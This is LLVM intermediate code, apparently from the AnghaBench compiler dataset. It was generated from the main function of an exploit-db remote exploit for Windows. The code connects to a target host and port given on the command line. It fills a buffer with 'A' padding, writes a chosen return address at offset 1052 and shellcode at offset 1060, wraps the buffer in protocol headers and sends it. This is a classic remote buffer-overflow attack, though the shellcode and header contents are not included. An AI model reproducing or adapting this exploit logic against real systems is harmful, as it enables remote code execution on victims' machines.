; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_944.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_944.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { i8*, i8 }
%struct.sockaddr_in = type { %struct.TYPE_5__, i64, i32 }
%struct.TYPE_5__ = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [30 x i8] c"\0A [e] Error: WSAStartup():%d\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"\0A [e] Error: socket():%d\0A\00", align 1
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [23 x i8] c"\0A [e] Error: connect()\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c" [i] Connected : Yes\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c" [i] Target    : %s\0A\00", align 1
@supported = common dso_local global %struct.TYPE_6__* null, align 8
@TOPHEADER = common dso_local global i8* null, align 8
@BUFFERLEN = common dso_local global i32 0, align 4
@MIDDLEHEADER = common dso_local global i8* null, align 8
@BOTTOMHEADER = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c" [i] Buffer sent\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i8* null, i8** %8, align 8
  %9 = load i32, i32* %3, align 4
  %10 = load i8**, i8*** %4, align 8
  %11 = call i32 @ShowHeader(i32 %9, i8** %10)
  %12 = call i32 @MAKEWORD(i32 2, i32 2)
  %13 = call i64 @WSAStartup(i32 %12, i32* %6)
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %19

15:                                               ; preds = %2
  %16 = call i32 (...) @WSAGetLastError()
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i32 %16)
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i32, i32* @AF_INET, align 4
  %21 = load i32, i32* @SOCK_STREAM, align 4
  %22 = load i32, i32* @IPPROTO_TCP, align 4
  %23 = call i32 @WSASocket(i32 %20, i32 %21, i32 %22, i32 0, i32 0, i32 0)
  store i32 %23, i32* %5, align 4
  %24 = load i32, i32* @INVALID_SOCKET, align 4
  %25 = icmp eq i32 %23, %24
  br i1 %25, label %26, label %30

26:                                               ; preds = %19
  %27 = call i32 (...) @WSAGetLastError()
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i32 %27)
  %29 = call i32 @exit(i32 1) #3
  unreachable

30:                                               ; preds = %19
  %31 = load i32, i32* @AF_INET, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %31, i32* %32, align 8
  %33 = load i8**, i8*** %4, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i64 @atoi(i8* %35)
  %37 = call i64 @htons(i64 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i64 %37, i64* %38, align 8
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @inet_addr(i8* %41)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %43, i32 0, i32 0
  %45 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %44, i32 0, i32 0
  store i32 %42, i32* %45, align 8
  %46 = load i32, i32* %5, align 4
  %47 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %48 = call i64 @connect(i32 %46, %struct.sockaddr* %47, i32 24)
  %49 = load i64, i64* @SOCKET_ERROR, align 8
  %50 = icmp eq i64 %48, %49
  br i1 %50, label %51, label %54

51:                                               ; preds = %30
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %53 = call i32 @exit(i32 1) #3
  unreachable

54:                                               ; preds = %30
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %56 = load %struct.TYPE_6__*, %struct.TYPE_6__** @supported, align 8
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = call i64 @atoi(i8* %59)
  %61 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %56, i64 %60
  %62 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %63)
  %65 = load i8*, i8** @TOPHEADER, align 8
  %66 = call i32 @strlen(i8* %65)
  %67 = load i32, i32* @BUFFERLEN, align 4
  %68 = add nsw i32 %66, %67
  %69 = load i8*, i8** @MIDDLEHEADER, align 8
  %70 = call i32 @strlen(i8* %69)
  %71 = add nsw i32 %68, %70
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @strlen(i8* %74)
  %76 = add nsw i32 %71, %75
  %77 = add nsw i32 %76, 1
  %78 = load i8**, i8*** %4, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 2
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @strlen(i8* %80)
  %82 = add nsw i32 %77, %81
  %83 = load i8*, i8** @BOTTOMHEADER, align 8
  %84 = call i32 @strlen(i8* %83)
  %85 = add nsw i32 %82, %84
  %86 = add nsw i32 %85, 1
  %87 = call i64 @malloc(i32 %86)
  %88 = inttoptr i64 %87 to i8*
  store i8* %88, i8** %8, align 8
  %89 = load i8*, i8** %8, align 8
  %90 = call i32 @memset(i8* %89, i8 signext 0, i32 8)
  %91 = load i8*, i8** %8, align 8
  %92 = load i8*, i8** @TOPHEADER, align 8
  %93 = load i8*, i8** @TOPHEADER, align 8
  %94 = call i32 @strlen(i8* %93)
  %95 = call i32 @memcpy(i8* %91, i8* %92, i32 %94)
  %96 = load i8*, i8** %8, align 8
  %97 = load i8*, i8** @TOPHEADER, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %96, i64 %99
  %101 = load i32, i32* @BUFFERLEN, align 4
  %102 = call i32 @memset(i8* %100, i8 signext 65, i32 %101)
  %103 = load i8*, i8** %8, align 8
  %104 = load i8*, i8** @TOPHEADER, align 8
  %105 = call i32 @strlen(i8* %104)
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %103, i64 %106
  %108 = getelementptr inbounds i8, i8* %107, i64 1052
  %109 = load %struct.TYPE_6__*, %struct.TYPE_6__** @supported, align 8
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 3
  %112 = load i8*, i8** %111, align 8
  %113 = call i64 @atoi(i8* %112)
  %114 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %109, i64 %113
  %115 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %114, i32 0, i32 1
  %116 = call i32 @memcpy(i8* %108, i8* %115, i32 8)
  %117 = load i8*, i8** %8, align 8
  %118 = load i8*, i8** @TOPHEADER, align 8
  %119 = call i32 @strlen(i8* %118)
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %117, i64 %120
  %122 = getelementptr inbounds i8, i8* %121, i64 1060
  %123 = load i8*, i8** @shellcode, align 8
  %124 = load i8*, i8** @shellcode, align 8
  %125 = call i32 @strlen(i8* %124)
  %126 = call i32 @memcpy(i8* %122, i8* %123, i32 %125)
  %127 = load i8*, i8** %8, align 8
  %128 = load i32, i32* @BUFFERLEN, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8*, i8** @MIDDLEHEADER, align 8
  %132 = load i8*, i8** @MIDDLEHEADER, align 8
  %133 = call i32 @strlen(i8* %132)
  %134 = call i32 @memcpy(i8* %130, i8* %131, i32 %133)
  %135 = load i8*, i8** %8, align 8
  %136 = load i32, i32* @BUFFERLEN, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i8*, i8** @MIDDLEHEADER, align 8
  %140 = call i32 @strlen(i8* %139)
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %138, i64 %141
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 1
  %145 = load i8*, i8** %144, align 8
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 1
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @strlen(i8* %148)
  %150 = call i32 @memcpy(i8* %142, i8* %145, i32 %149)
  %151 = load i8*, i8** %8, align 8
  %152 = load i32, i32* @BUFFERLEN, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %151, i64 %153
  %155 = load i8*, i8** @MIDDLEHEADER, align 8
  %156 = call i32 @strlen(i8* %155)
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i8, i8* %154, i64 %157
  %159 = load i8**, i8*** %4, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 1
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 @strlen(i8* %161)
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8, i8* %158, i64 %163
  %165 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %166 = call i32 @memcpy(i8* %164, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i32 %165)
  %167 = load i8*, i8** %8, align 8
  %168 = load i32, i32* @BUFFERLEN, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %167, i64 %169
  %171 = load i8*, i8** @MIDDLEHEADER, align 8
  %172 = call i32 @strlen(i8* %171)
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8, i8* %170, i64 %173
  %175 = load i8**, i8*** %4, align 8
  %176 = getelementptr inbounds i8*, i8** %175, i64 1
  %177 = load i8*, i8** %176, align 8
  %178 = call i32 @strlen(i8* %177)
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8, i8* %174, i64 %179
  %181 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds i8, i8* %180, i64 %182
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 2
  %186 = load i8*, i8** %185, align 8
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @strlen(i8* %189)
  %191 = call i32 @memcpy(i8* %183, i8* %186, i32 %190)
  %192 = load i8*, i8** %8, align 8
  %193 = load i32, i32* @BUFFERLEN, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8, i8* %192, i64 %194
  %196 = load i8*, i8** @MIDDLEHEADER, align 8
  %197 = call i32 @strlen(i8* %196)
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8, i8* %195, i64 %198
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 1
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @strlen(i8* %202)
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %199, i64 %204
  %206 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i8, i8* %205, i64 %207
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 2
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @strlen(i8* %211)
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds i8, i8* %208, i64 %213
  %215 = load i8*, i8** @BOTTOMHEADER, align 8
  %216 = load i8*, i8** @BOTTOMHEADER, align 8
  %217 = call i32 @strlen(i8* %216)
  %218 = call i32 @memcpy(i8* %214, i8* %215, i32 %217)
  %219 = load i32, i32* %5, align 4
  %220 = load i8*, i8** %8, align 8
  %221 = load i8*, i8** %8, align 8
  %222 = call i32 @strlen(i8* %221)
  %223 = call i32 @send(i32 %219, i8* %220, i32 %222, i32 0)
  %224 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  %225 = load i32, i32* %5, align 4
  %226 = call i32 @closesocket(i32 %225)
  ret void
}

declare dso_local i32 @ShowHeader(i32, i8**) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @WSAGetLastError(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @WSASocket(i32, i32, i32, i32, i32, i32) #1

declare dso_local i64 @htons(i64) #1

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @closesocket(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
